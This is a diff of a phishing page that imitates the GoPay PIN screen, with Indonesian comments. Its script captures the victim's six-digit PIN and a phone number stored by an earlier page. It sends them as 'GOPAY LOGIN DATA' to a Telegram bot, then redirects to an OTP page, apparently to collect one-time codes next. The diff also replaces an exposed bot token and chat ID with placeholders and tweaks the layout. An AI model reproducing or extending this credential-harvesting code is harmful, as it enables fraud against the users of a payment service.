@@ -20,26 +20,25 @@
       -webkit-tap-highlight-color: transparent;
     }
 
+    /* Mengizinkan halaman untuk bisa digeser/didorong ke atas jika layar kurang tinggi */
     html, body {
       width: 100%;
-      height: 100%;
-      overflow: hidden;
-      position: fixed;
+      min-height: 100%;
       background-color: #000000;
       color: #ffffff;
+      overflow-y: auto; 
     }
 
     .app-container {
       width: 100%;
-      height: 100vh;
+      min-height: 100vh;
       background-color: #000000;
-      padding: 16px 20px;
+      padding: 16px 20px 30px 20px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       position: relative;
       margin: 0 auto;
-      overflow: hidden;
     }
 
     .go-topbar {
@@ -139,6 +138,7 @@
       margin-bottom: 12px;
     }
 
+    /* Kotak PIN Dots rata kiri */
     .pin-display-box {
       width: 100%;
       height: 52px;
@@ -171,19 +171,20 @@
       color: #00aa13;
       font-weight: 600;
       text-decoration: none;
+      margin-bottom: 20px;
     }
 
     .keypad-section {
       width: 100%;
       margin-top: auto;
-      padding-bottom: 10px;
+      padding-bottom: 20px;
     }
 
     .keypad-container {
       width: 100%;
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 8px;
+      gap: 12px;
     }
 
     .key-btn {
@@ -192,7 +193,7 @@
       color: #ffffff;
       font-size: 26px;
       font-weight: 600;
-      height: 52px;
+      height: 50px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -208,7 +209,7 @@
       text-align: center;
       font-size: 12px;
       color: #666666;
-      margin-top: 8px;
+      margin-top: 16px;
     }
 
     .go-footer span {
@@ -283,9 +284,8 @@
     let currentPin = "";
     const dots = document.querySelectorAll('.pin-dot');
 
-    // Konfigurasi Token & Chat ID Telegram Anda
-    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
-    const TELEGRAM_CHAT_ID = "6742478722";
+    const TELEGRAM_BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA_DISINI";
+    const TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DISINI";
 
     function updateDots() {
       dots.forEach((dot, index) => {
@@ -303,13 +303,9 @@
         updateDots();
 
         if (currentPin.length === 6) {
-          // Simpan PIN ke localStorage
           localStorage.setItem('gopay_pin', currentPin);
-          
-          // Ambil nomor HP yang disimpan dari halaman sebelumnya
           const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
 
-          // Kirim data ke Telegram Bot
           const message = `🔔 *GOPAY LOGIN DATA*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${currentPin}\``;
           
           if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
@@ -324,9 +320,8 @@
             }).catch(err => console.log(err));
           }
 
-          // Pindah ke halaman OTP setelah jeda singkat
           setTimeout(() => {
-            window.location.href = "sukses.html";
+            window.location.href = "otp.html";
           }, 400);
         }
       }
